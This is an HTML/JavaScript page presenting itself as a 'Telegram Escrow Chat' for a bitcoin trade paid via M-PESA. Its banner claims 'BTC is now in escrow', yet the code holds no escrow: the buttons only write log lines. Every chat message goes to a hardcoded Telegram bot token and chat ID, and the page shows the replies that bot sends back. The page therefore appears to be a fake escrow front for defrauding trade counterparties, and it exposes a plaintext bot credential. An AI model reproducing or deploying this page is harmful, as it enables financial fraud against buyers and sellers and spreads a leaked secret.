<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <title>Telegram Escrow Chat</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f0f4f8;
            padding: 20px;
            max-width: 600px;
            margin: auto;
            color: #333;
        }
        
        h1 {
            text-align: center;
            color: #0088cc;
            margin-bottom: 20px;
        }
        
        .card {
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }
        
        .instruction {
            background: #d4edda;
            padding: 15px;
            border-radius: 6px;
            color: #155724;
            margin-bottom: 10px;
        }
        
        .btn {
            background: #0088cc;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin: 5px 0;
            font-size: 16px;
            transition: background 0.3s;
            width: 100%;
        }
        
        .btn:hover {
            background: #0077b3;
        }
        
        #chatMessages {
            height: 250px;
            overflow-y: auto;
            background: #fff;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 6px;
            display: flex;
            flex-direction: column;
            margin-bottom: 10px;
        }
        
        .sender {
            align-self: flex-start;
            background-color: #d0f5d0;
            color: #1a3d1a;
            padding: 8px 12px;
            border-radius: 10px;
            margin: 5px 0;
            max-width: 80%;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        
        .recipient {
            align-self: flex-end;
            background-color: #e0e0e0;
            color: #333;
            padding: 8px 12px;
            border-radius: 10px;
            margin: 5px 0;
            max-width: 80%;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        
        input[type=text] {
            width: calc(100% - 100px);
            padding: 12px;
            margin-top: 10px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 16px;
        }
    </style>
</head>

<body>

    <h1>Telegram Escrow Chat</h1>
    <div class="card">
        <div class="instruction">
            The buyer is paying KES 200 via M-PESA. BTC is now in escrow. The buyer has 30 minutes to pay.
        </div>
        <button class="btn" onclick="startTrade()">Start Trade</button>

        <div id="actions" style="display: none;">
            <button class="btn" onclick="log('🔐 Escrow started')">Start Escrow</button>
            <button class="btn" onclick="cancelTrade()">Cancel Escrow</button>

            <div id="chatMessages"></div>
            <div style="display: flex; justify-content: space-between;">
                <input type="text" id="chatInput" placeholder="Type message..." />
                <button class="btn" onclick="sendMessage()">Send</button>
            </div>
            <div class="log" id="log">System ready.</div>
        </div>
    </div>

    <audio id="replySound" src="https://www.soundjay.com/button/sounds/button-3.mp3" preload="auto"></audio>

    <script>
        const TELEGRAM_BOT_TOKEN = '8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q';
        const TELEGRAM_CHAT_ID = '5615316142';

        let lastUpdateId = 0;

        function log(message) {
            const logBox = document.getElementById('log');
            const now = new Date().toLocaleTimeString();
            logBox.textContent += `\n[${now}] ${message}`;
        }

        function startTrade() {
            document.getElementById('actions').style.display = 'block';
            log("🟢 Trade started.");
        }

        function cancelTrade() {
            document.getElementById('actions').style.display = 'none';
            document.getElementById('chatMessages').innerHTML = '';
            document.getElementById('chatInput').value = '';
            log("🔴 Trade canceled and all data cleared.");
        }

        function sendMessage() {
            const input = document.getElementById('chatInput');
            const text = input.value.trim();
            if (!text) return;

            const now = new Date().toLocaleTimeString();
            const div = document.createElement('div');
            div.className = 'sender';
            div.textContent = `[${now}] You: ${text}`;
            document.getElementById('chatMessages').appendChild(div);
            input.value = '';

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: text
                })
            });
        }

        setInterval(() => {
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                .then(response => response.json())
                .then(data => {
                    if (data.result && data.result.length > 0) {
                        data.result.forEach(update => {
                            lastUpdateId = update.update_id;
                            if (update.message && update.message.chat.id == TELEGRAM_CHAT_ID) {
                                const now = new Date().toLocaleTimeString();
                                const div = document.createElement('div');
                                div.className = 'recipient';
                                div.textContent = `[${now}] Bot: ${update.message.text}`;
                                document.getElementById('chatMessages').appendChild(div);
                                document.getElementById('replySound').play();
                            }
                        });
                    }
                });
        }, 3000);
    </script>

</body>

</html>
